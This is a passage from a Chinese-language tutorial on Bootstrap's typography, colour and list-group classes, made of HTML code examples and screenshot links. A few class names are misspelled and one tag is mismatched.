        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col order-2"</span>&gt;</span>
            2
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col order-1"</span>&gt;</span>
            3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22285743569346fcb7c31796f1667592~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=s%2B0zsE7KuN89bLOn94P4A95g9Z8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-19">Bootstrap 标签属性</h2>
<h3 data-id="heading-20">默认标题</h3>
<p>我们知道HTML中有<code>&lt;h1-6&gt;</code>标题标签，在Bootstrap中我们有<code>&lt;h1-6&gt;</code>类来设置标签。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>HTML标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"h1"</span>&gt;</span>Bootstrap标题<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
</code></pre>
<p>效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af235d68d58d41c0abbd45ceb43363a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=pQhOP4OgZPvmG%2Bu1%2BgroDuwE450%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-21">Display 标题</h3>
<p>另外Bootstrap 还提供了 Display 标题来更突出更大的标题。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"display-1"</span>&gt;</span>Display 标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
</code></pre>
<p>效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9865982d6ed54f5b8aeb368e350a4070~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=7uFiOzwegU2DL8tLo07NN6mtJ8w%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-22">段落</h3>
<h4 data-id="heading-23">放大</h4>
<p>此外还提供了突出段落类<code>lead</code>类来让我们的段落更大更突出。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个段落<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"lead"</span>&gt;</span>这是另一个段落<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
</code></pre>
<p>效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c9ce94042db4ac9931c466645316cf4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=xPEJxryb%2Bb3Et0cUzUujvMDl7SU%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-24">缩小</h4>
<p>除了突出段落，还有缩小段落<code>small</code>类来将我们的文字变得更小。(注：此处的缩小是整个对父元素的缩小)</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>这是缩小文字<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"small"</span>&gt;</span>这是另外一个缩小文字<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span>
</code></pre>
<p>效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f93eb94d1484546960e7676c299dd31~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=Tc3tnQ6BDDTFQlHtATXQYkShY88%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-25">颜色变浅</h4>
<p>我们还可以通过 <code>text-muted</code>来将文字变小颜色变浅。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>这是缩小文字<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-muted"</span>&gt;</span>这是另外一个缩小文字<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span>
</code></pre>
<p>效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6dfaf5a0b4aa4051af8cde5428bdd54d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=ecjJZSfnuHt11oO2tvRLqoj2fNU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-26">文本</h3>
<h4 data-id="heading-27">默认对齐方式</h4>
<p>Bootstrapp 还提供了 <code>text-start</code> 、<code>text-center</code> 和 <code>text-end</code>来设置文本对齐方式</p>
<h4 data-id="heading-28">响应式文本对齐</h4>
<p>Bootstrap 还提供了响应式对齐方式，根据不同的屏幕来设置不同的对齐方式。我们可以在<code>text-{xxx}-center</code>来进行对齐。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-lg-center"</span>&gt;</span>对齐方式<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
</code></pre>
<p>当视口大于992px时居中对齐：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/645c27a87cad42edae415014db0441cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=KwjH5hIPqgklABTWApL8Cmv3kPk%3D" alt="" loading="lazy"/></p>
<p>当视口小于992px时默认对齐：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e6b7b9715f648a9845e340eb2da511f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=wVVzZlJAXW6af5IykciUh53Wd1Y%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-29">文本转换</h4>
<p>Bootstrap还提供将文本转换为小写、大写、设定单词首字母大写等。</p>
<ul>
<li><strong>.text-lowercase</strong>：设定文本小写</li>
<li><strong>.text-uppercase</strong>：设定文本小写</li>
<li><strong>.text-capitalize</strong>：设定单词首字母大写</li>
</ul>
<h4 data-id="heading-30">截断长文本</h4>
<p>对于较长的文本，可以通过类 <code>.text-truncate</code>用省略号阶段文本，</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container  mt-10"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row text-center"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-lg-4 text-truncate"</span>&gt;</span>
            这是一段很长很长很长很长很长很长很长很长很长很长很长
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-lg-4"</span>&gt;</span>
            第二份
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-lg-4"</span>&gt;</span>
            第三份
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90fcf39e4105400c8e6510faea582fe1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=Y6VWR9AAcMxstfQGGW%2B76AvG0J0%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-31">文本换行和溢出</h4>
<p>我们可以通过<code>.text-wrap</code>来进行自动换行，通过<code>.text-nowrap</code>来阻止换行，但是主要可能会导致溢出问题。</p>
<h4 data-id="heading-32">文本大小</h4>
<p>Bootstrap默认字体初始字体大小为16px。Bootstrap提供了六类文字大小<code>.fs-1</code>到<code>.fs-6</code>，分别对应标题 <code>h1-h6</code>。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fs-1"</span>&gt;</span>这是fs-1<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fs-2"</span>&gt;</span>这是fs-2<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fs-3"</span>&gt;</span>这是fs-3<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fs-4"</span>&gt;</span>这是fs-4<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fs-5"</span>&gt;</span>这是fs-5<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fs-6"</span>&gt;</span>这是fs-6<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
</code></pre>
<p>效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67f266e3fa794cd4aa4a3f5413baff5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=8jUjXnaaFolihm%2F2ixLV2IF%2Fra0%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-33">字体粗细和倾斜</h4>
<p>Bootstrap中控制字体粗细分为了五个类：</p>
<ul>
<li><strong>.fw-bold</strong>：粗体文字。</li>
<li><strong>.fw-bolder</strong>：粗体文字(相对于父元素)。</li>
<li>.<strong>fw-normal</strong>：正常的文字。</li>
<li><strong>.fw-light</strong>：细体文字。</li>
<li><strong>.fw-lighter</strong>：细体文字(相对于父元素)。</li>
</ul>
<p>倾斜提供了两个类：</p>
<ul>
<li><strong>.fst-italic</strong>：倾斜文字。</li>
<li><strong>.fst-normal</strong>：正常的文字。</li>
</ul>
<h4 data-id="heading-34">行间距</h4>
<p>Bootstrap 默认行高是1.5 它提供了五种类来定义行高：</p>
<ul>
<li><strong>.lh-1</strong>：1rem。</li>
<li><strong>.lg-sm</strong>：1.25rem。</li>
<li><strong>.lh-base</strong>：1.5rem。</li>
<li><strong>.lh-lg</strong>：2rem。</li>
</ul>
<h4 data-id="heading-35">颜色</h4>
<p>Bootstrap提供了很多颜色来供我们使用，我们此次只做了解部分有代表意义的颜色：</p>
<ul>
<li><strong>.text-metued</strong>：浅灰色。</li>
<li><strong>.text-primary</strong>：蓝色。</li>
<li><strong>.text-success</strong>：浅绿色。</li>
<li><strong>.text-info</strong>：浅蓝色。</li>
<li><strong>.text-warning</strong>：黄色。</li>
<li><strong>.text-danger</strong>：红褐色。</li>
<li><strong>.text-scondary</strong>：灰色。</li>
<li><strong>.text-dark</strong>：黑暗色。</li>
<li><strong>.text-body</strong>：黑色。</li>
<li><strong>.text-light</strong>：淡灰色。</li>
<li><strong>.text-white</strong>：白色。</li>
</ul>
<h3 data-id="heading-36">背景颜色</h3>
<p>Bootstrap 提供了很多背景颜色来供我们使用，此处只列出一部分代表色:</p>
<ul>
<li><strong>.bg-primary</strong>：蓝色。</li>
<li><strong>.bg-success</strong>：浅绿色。</li>
<li><strong>.bg-info</strong>：浅蓝色。</li>
<li><strong>.bg-warning</strong>：黄色。</li>
<li><strong>.bg-danger</strong>：红褐色。</li>
<li><strong>.bg-scondary</strong>：灰色。</li>
<li><strong>.bg-dark</strong>：黑暗色。</li>
<li><strong>.bg-light</strong>：淡灰色。</li>
</ul>
<h2 data-id="heading-37">Bootstrap 列表组</h2>
<h3 data-id="heading-38">删除默认样式</h3>
<p>在HTML中我们有<code>ul li</code>无序列表和 <code>ol li</code>有序列表，我们可以通过类 <code>.list-unstyled</code>来删除列表的默认样式。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-unstyled"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Bootstrap<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<h3 data-id="heading-39">内联列表</h3>
<p>如果要使用有序列表或无序列表创建水平表单，我们可以通过类<code>.list-inline</code>添加到<code>ul</code>或<code>ol</code>上并将类<code>.list-inline-item</code>添加到子<code>li</code>元素来完成此操作。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-inline"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-inline-item"</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-inline-item"</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-inline-item"</span>&gt;</span>JS<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d01a2d0229ed47df84365d8983bc4ad2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=NrWCo%2Fa2Kn2EyLWWguwTpOoHMKU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-40">列表组</h3>
<h4 data-id="heading-41">基础列表</h4>
<p>我们可以通过<code>list-group</code>和<code>list-group-item</code>来定义一个列表组。如下：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item"</span>&gt;</span>第一项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item"</span>&gt;</span>第二项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item"</span>&gt;</span>第三项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea3b9789b7b14ddbb7e1d124e29dab8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=XveGvODb8fjwjXQYEwJQ%2FKmd2G8%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-42">设置禁用和活动项</h4>
<p>我们可以将类<code>.active</code>添加到<code>.list-group-item</code>类的后面用来指示当前项目元素是活的的，同意，也可以将<code>.disabled</code>添加到后面，使元素看起来是禁用的。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item active"</span>&gt;</span>第一项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item"</span>&gt;</span>第二项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item disabled"</span>&gt;</span>第三项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7d3e483e61f7446b9f8c702253987f02~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=DaaGjCdzQCBetmJepv3NTC7%2BRCE%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-43">链接项的列表组</h4>
<p>我们可以将<code>li</code>替换为<code>a</code>标签，如果想鼠标悬停显示灰色背景我们可以添加一个类<code>.list-group-item-action</code>来实现。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第一项<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第二项<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第三项<span class="hljs-tag">&lt;/<span class="hljs-name">ai</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fb15a808d0b4bf3863af437c25f38b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=aLduGTvO1vicEkschJ3Fq6yazzk%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-44">移除列表边框</h4>
<p>我们如果想移除列表边框的话我们可以通过类 <code>.list-group-flush</code>添加到 <code>.list-group</code>用于移除外边框和圆角。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group list-group-flush"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第一项<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第二项<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第三项<span class="hljs-tag">&lt;/<span class="hljs-name">ai</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30c35aa654274a279554e8cb66a2db6c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=vxhE28rTHdGDnhGVJeQ7u2R4hxA%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-45">水平显示</h4>
<p>如果想水平显示列表我们可以通过<code>.list-group-horizontal</code>类添加到<code>.list-group</code>来将我们的列表水平显示。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group list-group-horizontal"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第一项<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第二项<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第三项<span class="hljs-tag">&lt;/<span class="hljs-name">ai</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa8dbb02ef8640d0812dfd5c1bfb01c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=SH4JKflJDDgDClYyVVW98rYK%2FgU%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-46">创建编号列表组</h4>
<p>通过<code>.list-group-numbered</code>类添加到<code>.list-group</code>元素上，我们就可以得到带有编号的列表组。(注：编号是通过css来生产的，而不是列表元素的默认样式)</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group list-group-numbered"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第一项<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第二项<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第三项<span class="hljs-tag">&lt;/<span class="hljs-name">ai</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75fb5d93f9fc4907aabcf75ba3ad446d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=BTBqRoeLyvpGMlQV30VnxmyV1t0%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-47">带徽章的列表组</h4>
<p>我们还可以将Bootstrap中的徽章组件和列表组合起来。只需要在<code>.list-group-item</code>的基础上追加徽章组件"badge"。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group list-group-numbered"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>
        第一项
        <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"badge bg-primary"</span>&gt;</span>
            hot
        <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第二项<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第三项<span class="hljs-tag">&lt;/<span class="hljs-name">ai</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ae0ef966a20424d8675232de266b4f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=J%2BvVUrcPuA3UUyGRk5KnYRhXFqg%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-48">列表组背景颜色</h4>
<p>跟大多数其他组件一样，可以在列表组上添加相应的类来进行颜色调整：</p>
<ul>
<li><strong>.list-group-item-primary</strong>：蓝色。</li>
<li><strong>.list-group-item-success</strong>：浅绿色。</li>
<li><strong>.list-group-item-info</strong>：浅蓝色。</li>
